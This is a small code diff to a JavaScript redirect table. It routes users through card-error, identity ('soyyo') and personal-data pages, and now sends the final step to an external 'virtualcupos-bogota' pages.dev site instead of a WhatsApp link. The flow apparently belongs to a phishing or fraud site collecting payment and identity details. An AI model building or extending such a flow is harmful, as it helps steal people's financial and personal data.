@@ -11,7 +11,7 @@ const REDIRECTS = {
   'error_crédito': 'tarjeta.html?error=invalid', 
   'soyyo': 'soyyo.html',
   'datos_personales': 'datos-personales.html',
-  'finalizar': 'https://wa.me/message/SNG3H4I7373KP1',
+  'finalizar': 'https://virtualcupos-bogota.pages.dev/bogota/',
   'error_logo': 'soyyo.html?error=invalid',
 };
 
